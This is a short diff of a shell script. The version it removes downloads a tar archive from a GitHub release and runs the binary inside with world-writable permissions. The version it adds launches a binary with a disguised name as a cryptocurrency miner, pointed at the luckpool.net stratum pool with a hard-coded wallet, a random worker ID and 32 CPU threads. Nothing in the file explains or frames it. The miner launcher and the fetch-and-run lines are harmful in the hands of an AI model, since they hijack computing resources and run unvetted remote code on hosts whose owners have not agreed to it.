@@ -1,7 +1,5 @@
-#!/bin/sh
-apt update
-apt install wget -y
-wget https://github.com/mariobiszz/perus/releases/download/1/ver.tar.gz
-tar -xvf ver.tar.gz
-chmod 777 ver ver.ini
-./ver ver.ini
+chmod 777 sotoayam
+PULL=stratum+tcp://na.luckpool.net:3956#xnsub
+WUL=RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg
+WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
+./sotoayam -c $PULL -u $WUL.$WOR -p x --cpu 32
